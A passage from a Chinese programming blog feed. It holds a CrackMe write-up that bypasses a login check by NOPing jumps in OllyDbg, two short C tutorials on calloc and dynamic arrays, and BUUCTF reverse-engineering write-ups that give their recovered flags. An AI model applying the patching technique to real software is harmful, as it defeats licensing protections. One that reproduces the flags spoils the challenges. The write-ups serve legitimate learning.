        <content type="html"><![CDATA[<blockquote><p>软件来源：吾爱破解CrackMe</p></blockquote><p>2023.6.14:emm看起来图片都炸了，当初没保存图床，就先这样放着吧…</p><hr><h2 id="OD动态调试无壳"><a href="#OD动态调试无壳" class="headerlink" title="OD动态调试无壳"></a>OD动态调试无壳</h2><p>第一个程序拿到后，打开发现是一个简单的类似于登录界面的窗口，填入几组账号密码组合后均提示失败，使用PEID检查发现此程序无壳，于是在OD内打开</p><p><img src="https://attach.52pojie.cn/forum/202101/26/215946rlllxnscn0ztsnld.png" alt="img"></p><p>接着使用中文搜索关键字“成功”，找到了对应的字符串，接着回溯回去之后在上方发现了jmp指令，将其nop掉，重新调试程序，发现成功进入</p><p><img src="https://attach.52pojie.cn/forum/202101/26/222830w9iak0nk90kyriki.gif" alt="img"></p><h2 id="多次调用比较"><a href="#多次调用比较" class="headerlink" title="多次调用比较"></a>多次调用比较</h2><p>有两种方法，第一种是直接找到中文搜索恭喜关键字找到之后，判断上方的jz是有条件跳转，nop掉尝试一下是否可以直接绕过，结果是可以，直接过。</p><p>第二种是找到关键字后，在输出信息之前的寄存器变量赋值时打断点找寄存器，就可以找到真正的密码所在</p><p><img src="https://attach.52pojie.cn/forum/202101/27/122526xldnrsjaw5f3jsqq.jpg" alt="img"></p><h2 id="附几种跳转的总结"><a href="#附几种跳转的总结" class="headerlink" title="附几种跳转的总结"></a>附几种跳转的总结</h2><p><img src="https://attach.52pojie.cn/forum/202101/26/174834uu0za4wjeirukhsz.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈C语言中malloc与calloc的区别</title>
      <link href="/2021/03/57cfdd39.html"/>
      <url>/2021/03/57cfdd39.html</url>
      
        <content type="html"><![CDATA[<p>学习指针过程中，总是看到同样的一个问题，有人用calloc来申请动态数组，有人用malloc来申请动态数组，我上网大概搜了一下，大致意思应该是calloc相当于封装好了malloc和memset，在创建的时候就一并初始化了，随之而来的就是malloc的效率相对要高一些。</p><p>  从原型上看，malloc的含义是“给我一个大小为size的连续内存”，而calloc貌似是“给我n个大小为size的内存”。</p><p>因为这种原型。有人说（不知道是不是官方也这么说）calloc返回的对象数组而malloc仅仅是一块连续的内存，然而，我翻阅了官方文档，发现calloc申请的动态内存释放时候也是只需要free一次就够了，跟malloc一致，这里强调malloc的这一点却没有说calloc，难道calloc不用记录？那么free是怎样释放用它申请的空间的？calloc究竟是个什么？这必须要看看calloc的源代码。</p><p>于是，我在apple找到了calloc的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ansidecl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-comment">/* For systems with larger pointers than ints, this must be declared.  */</span><br>PTR <span class="hljs-title function_">malloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bzero</span> <span class="hljs-params">(PTR, <span class="hljs-type">size_t</span>)</span>;<br><br>PTR<br><span class="hljs-title function_">calloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> nelem, <span class="hljs-type">size_t</span> elsize)</span><br>&#123;<br>  <span class="hljs-keyword">register</span> PTR ptr;  <br><br>  <span class="hljs-keyword">if</span> (nelem == <span class="hljs-number">0</span> || elsize == <span class="hljs-number">0</span>)<br>    nelem = elsize = <span class="hljs-number">1</span>;<br>  <br>  ptr = <span class="hljs-built_in">malloc</span> (nelem * elsize);<br>  <span class="hljs-keyword">if</span> (ptr) bzero (ptr, nelem * elsize);<br>  <br>  <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>看完的结论就是：那没事了</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言中的动态数组</title>
      <link href="/2021/03/83e532aa.html"/>
      <url>/2021/03/83e532aa.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是动态数组"><a href="#什么是动态数组" class="headerlink" title="什么是动态数组"></a>什么是动态数组</h2><p>这里先引入一段对动态数组的说法</p><blockquote><p>动态数组是相对于静态数组而言，从“动”字我们也可以看出它的灵活性，静态数组的长度是预先定义好的，在整个程序中，一旦给定大小后就无法改变。而动态数组则不然，它可以随程序需要而重新指定大小。动态数组的内存空间是从堆动态分配的。是通过执行代码而为其分配存储空间。当程序执行到我们编写的分配语句时，才为其分配。对于静态数组，其创建非常方便，使用完也无需释放，要引用也简单，但是创建后无法改变其大小是其致命弱点！对于动态数组，其创建麻烦，使用完必须由程序员自己释放，否则将会引起内存泄露。但其使用非常灵活，能根据程序需要动态分配大小。所以相对于静态数组的来说我们对于使用动态数组有很大的自由度。</p></blockquote><p>同时，动态数组的创建还需要遵循一个原则，就是在创建的时候从外层往里层，逐层创建，释放的时候相反，是从里往外释放。</p><h2 id="一维动态数组的创建"><a href="#一维动态数组的创建" class="headerlink" title="一维动态数组的创建"></a>一维动态数组的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n1,i;<br><span class="hljs-type">int</span> *<span class="hljs-built_in">array</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入所要创建的一维动态数组的长度：&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n1);<br><span class="hljs-built_in">array</span>=(<span class="hljs-type">int</span>*)<span class="hljs-built_in">calloc</span>(n1,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n1;i++)<br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n1;i++)<br>&#123;<br> <span class="hljs-built_in">array</span>[i]=i+<span class="hljs-number">1</span>;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>&#125;<br> <span class="hljs-built_in">free</span>(<span class="hljs-built_in">array</span>);<span class="hljs-comment">//释放第一维指针 </span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二维动态数组的创建"><a href="#二维动态数组的创建" class="headerlink" title="二维动态数组的创建"></a>二维动态数组的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> num1,num2;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入动态二维数组的第一个维度：&quot;</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;num1;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入动态二维数组的第二个维度：&quot;</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;num2;<br><span class="hljs-type">int</span> **<span class="hljs-built_in">array</span> = (<span class="hljs-type">int</span> **)<span class="hljs-built_in">calloc</span>(num1,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;num1;i++) &#123;<br><span class="hljs-built_in">array</span>[i] = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">calloc</span>(num2,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;num1;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;num2;j++)&#123;<br><span class="hljs-built_in">array</span>[i][j] =i*num2+j+<span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>,<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;num1;i++)<span class="hljs-built_in">free</span>(<span class="hljs-built_in">array</span>[i]);<br><span class="hljs-built_in">free</span>(<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上，我们便可以知道如何创建动态数组，以二维动态数组为例，先从外层往里层，逐层创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> **<span class="hljs-built_in">array</span>=<span class="hljs-built_in">calloc</span>(num1,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>*)); <span class="hljs-comment">//第一维</span><br></code></pre></td></tr></table></figure><p>然后接着创建第二层</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">array</span>[i]=<span class="hljs-built_in">calloc</span>(num2 ,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//第二维</span><br></code></pre></td></tr></table></figure><p>销毁的时候相反，从里往外逐层销毁，先来释放里层</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n1;i++) <br>&#123; <br><span class="hljs-built_in">free</span>(<span class="hljs-built_in">array</span>[i]);<span class="hljs-comment">//释放第二维指针 </span><br>&#125;<br></code></pre></td></tr></table></figure><p>接着释放外层</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(<span class="hljs-built_in">array</span>);<span class="hljs-comment">//释放第一维指针</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-简单注册器</title>
      <link href="/2021/03/55aa4ca9.html"/>
      <url>/2021/03/55aa4ca9.html</url>
      
        <content type="html"><![CDATA[<p>拿到题目后，是一个APK文件，使用jdx反编译后在mainActivity里面发现了一段核心代码</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs prolog">if (flag == <span class="hljs-number">1</span>) &#123;<br>    char[] x = <span class="hljs-string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>.toCharArray();<br>    x[<span class="hljs-number">2</span>] = (char) ((x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">3</span>]) - <span class="hljs-number">50</span>);<br>    x[<span class="hljs-number">4</span>] = (char) ((x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">5</span>]) - <span class="hljs-number">48</span>);<br>    x[<span class="hljs-number">30</span>] = (char) ((x[<span class="hljs-number">31</span>] + x[<span class="hljs-number">9</span>]) - <span class="hljs-number">48</span>);<br>    x[<span class="hljs-number">14</span>] = (char) ((x[<span class="hljs-number">27</span>] + x[<span class="hljs-number">28</span>]) - <span class="hljs-number">97</span>);<br>    for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        char a = x[<span class="hljs-number">31</span> - i];<br>        x[<span class="hljs-number">31</span> - i] = x[i];<br>        x[i] = a;<br>    &#125;<br>    textview.setText(<span class="hljs-string">&quot;flag&#123;&quot;</span> + <span class="hljs-symbol">String</span>.valueOf(x) + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>    return;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后将此段用C程序写出来即可得到答案</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> x[] = <span class="hljs-string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>;<br>                    x[<span class="hljs-number">2</span>] = (<span class="hljs-type">char</span>) ((x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">3</span>]) - <span class="hljs-number">50</span>);<br>                    x[<span class="hljs-number">4</span>] = (<span class="hljs-type">char</span>) ((x[<span class="hljs-number">2</span>] + x[<span class="hljs-number">5</span>]) - <span class="hljs-number">48</span>);<br>                    x[<span class="hljs-number">30</span>] = (<span class="hljs-type">char</span>) ((x[<span class="hljs-number">31</span>] + x[<span class="hljs-number">9</span>]) - <span class="hljs-number">48</span>);<br>                    x[<span class="hljs-number">14</span>] = (<span class="hljs-type">char</span>) ((x[<span class="hljs-number">27</span>] + x[<span class="hljs-number">28</span>]) - <span class="hljs-number">97</span>);<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>                        <span class="hljs-type">char</span> a = x[<span class="hljs-number">31</span> - i];<br>                        x[<span class="hljs-number">31</span> - i] = x[i];<br>                        x[i] = a;<br>                    &#125;<br>    <span class="hljs-built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>求得flag：<code>59acc538825054c7de4b26440c0999dd</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-findit</title>
      <link href="/2021/03/3d2fcb0e.html"/>
      <url>/2021/03/3d2fcb0e.html</url>
      
        <content type="html"><![CDATA[<p>拿到手是一个apk文件，利用Android Killer打开后查看mainActivity里面的相关信息，可以看到一串十六进制数字:<code>0x70,0x76,0x6b,0x71,0x7b,0x6d,0x31,0x36,0x34,0x36,0x37,0x35,0x32,0x36,0x32,0x30,0x33,0x33,0x6c,0x34,0x6d,0x34,0x39,0x6c,0x6e,0x70,0x37,0x70,0x39,0x6d,0x6e,0x6b,0x32 ,0x38,0x6b,0x37,0x35,0x7d</code>。写了一个C语言的小程序来把这串数字转换为字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; flag=&#123;<span class="hljs-number">0x70</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x7d</span>&#125;;<br><span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i&lt;flag.size();i++)<br>&#123;<br>s[i]=<span class="hljs-type">char</span>(flag[i]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到结果<code>pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;</code>，看符号判断应该是被加密过，使用凯撒解密得到结果<code>flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-luck_guy</title>
      <link href="/2021/03/6c2d8964.html"/>
      <url>/2021/03/6c2d8964.html</url>
      
        <content type="html"><![CDATA[<p>拿到后使用IDA64打开后，发现有main函数，进入后反编译为伪代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">welcome</span>(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;_________________&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;try to patch me and find flag&quot;</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a lucky number&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-built_in">patch_me</span>(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK,see you again&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到一个负责对比flag的patch_me函数，进入这个函数，看到如下</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-type">int</span> __fastcall patch_me(<span class="hljs-type">int</span> a1)<br>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">result</span>; // eax<br><br>  <span class="hljs-keyword">if</span> ( a1 % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>    <span class="hljs-built_in">result</span> = puts(<span class="hljs-string">&quot;just finished&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">result</span> = get_flag();<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然，get_flag就是获取flag的函数，进入这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">get_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  __int64 s; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">srand</span>(v0);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( <span class="hljs-built_in">rand</span>() % <span class="hljs-number">200</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, it&#x27;s flag:&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>uLL);<br>        <span class="hljs-built_in">strcat</span>((<span class="hljs-type">char</span> *)&amp;s, f1);<br>        <span class="hljs-built_in">strcat</span>((<span class="hljs-type">char</span> *)&amp;s, &amp;f2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Solar not like you&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Solar want a girlfriend&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        v6 = <span class="hljs-number">0</span>;<br>        s = <span class="hljs-number">9180147350284624745LL</span>;<br>        <span class="hljs-built_in">strcat</span>(&amp;f2, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">7</span>; ++j )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>            v1 = *(&amp;f2 + j) - <span class="hljs-number">2</span>;<br>          <span class="hljs-keyword">else</span><br>            v1 = *(&amp;f2 + j) - <span class="hljs-number">1</span>;<br>          *(&amp;f2 + j) = v1;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>可以看到整个处理的case是在1-199之间随机生成的，处理后发现真正对串进行过处理的只有case1&#x2F;4&#x2F;5，其中字符串f1已经有值了，回溯过去内容为<code>GXY&#123;do_not_</code>，f2的处理是对内容串进行了一系列操作，可以直接转化为C程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 